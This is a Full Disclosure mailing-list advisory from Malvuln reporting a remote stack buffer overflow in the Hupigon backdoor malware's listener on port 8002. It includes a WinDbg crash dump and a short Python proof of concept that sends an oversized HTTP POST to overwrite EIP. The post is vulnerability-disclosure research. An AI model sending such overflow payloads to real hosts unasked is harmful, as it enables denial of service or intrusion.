
Date: Thu, 21 Jan 2021 22:12:05 -0500
From: malvuln <malvuln13@...il.com>
To: fulldisclosure@...lists.org
Subject: [FD] Backdoor.Win32.Hupigon.adef / Remote Stack Buffer Overflow

Discovery / credits: Malvuln - malvuln.com (c) 2021
Original source:
https://malvuln.com/advisory/c8f55ce7bbec784a97d7bfc6d7b1931f.txt
Contact: malvuln13@...il.com
Media: twitter.com/malvuln

Threat: Backdoor.Win32.Hupigon.adef
Vulnerability: Remote Stack Buffer Overflow
Description: Backdoor Hupigon (Cracked by bartchen)
bartchen@....sina.com, listens on TCP ports 8001,8002,8003,8004 and
8005. Sending a large contaminated HTTP POST request to the target on
port 8002 results in a buffer overflow overwriting the instruction
pointer (EIP).
Type: PE32
MD5: c8f55ce7bbec784a97d7bfc6d7b1931f
Vuln ID: MVID-2021-0045
Dropped files:
ASLR: False
DEP: False
Safe SEH: True
Disclosure: 01/21/2021

Memory Dump:
(17a8.1448): Access violation - code c0000005 (first/second chance not
available)
eax=00000000 ebx=00000000 ecx=41414141 edx=773e9d70 esi=00000000 edi=00000000
eip=41414141 esp=000a1660 ebp=000a1680 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
41414141 ??              ???

0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


FAULTING_IP:
Backdoor_Win32_Hupigon_adef_c8f55ce7bbec784a97d7bfc6d7b1931f+16eec2
0056eec2 8b8010050000    mov     eax,dword ptr [eax+510h]

EXCEPTION_RECORD:  0019d7d4 -- (.exr 0x19d7d4)
ExceptionAddress: 0056eec2
(Backdoor_Win32_Hupigon_adef_c8f55ce7bbec784a97d7bfc6d7b1931f+0x0016eec2)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 41414651
Attempt to read from address 41414651

PROCESS_NAME:  Backdoor.Win32.Hupigon.adef.c8f55ce7bbec784a97d7bfc6d7b1931f.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced
memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p
referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_PARAMETER1:  00000008

EXCEPTION_PARAMETER2:  41414141

WRITE_ADDRESS:  41414141

FOLLOWUP_IP:
user32!UserCallWinProcCheckWow+0
764faf87 689c000000      push    9Ch

FAILED_INSTRUCTION_ADDRESS:
+0
41414141 ??              ???

MOD_LIST: <ANALYSIS/>

NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

IP_ON_HEAP:  41414141
The fault address in not in any loaded module, please check your build's rebase
log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may
contain the address if it were loaded.

IP_IN_FREE_BLOCK: 41414141

CONTEXT:  0019d824 -- (.cxr 0x19d824)
eax=41414141 ebx=0452c730 ecx=0019dc7c edx=00000000 esi=0046d060 edi=02850fd5
eip=0056eec2 esp=0019dc84 ebp=0019fce8 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
Backdoor_Win32_Hupigon_adef_c8f55ce7bbec784a97d7bfc6d7b1931f+0x16eec2:
0056eec2 8b8010050000    mov     eax,dword ptr [eax+510h]
ds:002b:41414651=????????
Resetting default scope

ADDITIONAL_DEBUG_TEXT:  Followup set based on attribute
[Is_ChosenCrashFollowupThread] from Frame:[0] on
thread:[PSEUDO_THREAD]

LAST_CONTROL_TRANSFER:  from 41414141 to 0056eec2

FAULTING_THREAD:  ffffffff

BUGCHECK_STR:  APPLICATION_FAULT_STACK_OVERFLOW_SOFTWARE_NX_FAULT_INVALID_EXPLOITABLE_FILL_PATTERN_41414141

PRIMARY_PROBLEM_CLASS:  STACK_OVERFLOW_INVALID_EXPLOITABLE_FILL_PATTERN_41414141

DEFAULT_BUCKET_ID:  STACK_OVERFLOW_INVALID_EXPLOITABLE_FILL_PATTERN_41414141

FRAME_ONE_INVALID: 1

STACK_TEXT:
0019dc84 0056eec2 backdoor_win32_hupigon_adef+0x16eec2
0019fcf0 41414141 unknown!printable+0x0
0019fcf4 41414141 unknown!printable+0x0
0019fdf4 764fb025 user32!UserCallWinProcCheckWow+0x9e
0019fef8 004644d8 backdoor_win32_hupigon_adef+0x644d8
0019ff64 00573179 backdoor_win32_hupigon_adef+0x173179
0019ff88 76e38654 kernel32!BaseThreadInitThunk+0x24
0019ff9c 773c4a77 ntdll!__RtlUserThreadStart+0x2f
0019ffe4 773c4a47 ntdll!_RtlUserThreadStart+0x1b


SYMBOL_NAME:  user32!UserCallWinProcCheckWow+0

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: user32

IMAGE_NAME:  user32.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  0

STACK_COMMAND:  .cxr 000000000019D824 ; kb ; dds 19dc84 ; kb

FAILURE_BUCKET_ID:
STACK_OVERFLOW_INVALID_EXPLOITABLE_FILL_PATTERN_41414141_c0000005_user32.dll!UserCallWinProcCheckWow

BUCKET_ID:  APPLICATION_FAULT_STACK_OVERFLOW_SOFTWARE_NX_FAULT_INVALID_EXPLOITABLE_FILL_PATTERN_41414141_BAD_IP_user32!UserCallWinProcCheckWow+0



Exploit/PoC:
from socket import *

MALWARE_HOST="x.x.x.x"
PORT=8002

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    PBARBAR="POST /"+"A"*4198+"HTTP/1.1\r\nContent-Type:
application/x-www-form-urlencoded\r\nContent-Length: "+"A"*4198

    s.send(PBARBAR)
    s.close()

    print("Backdoor.Win32.Hupigon.adef / Remote Stack Buffer Overflow");
    print("MD5: c8f55ce7bbec784a97d7bfc6d7b1931f");
    print("By Malvuln");

if __name__=="__main__":
    doit()



Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/
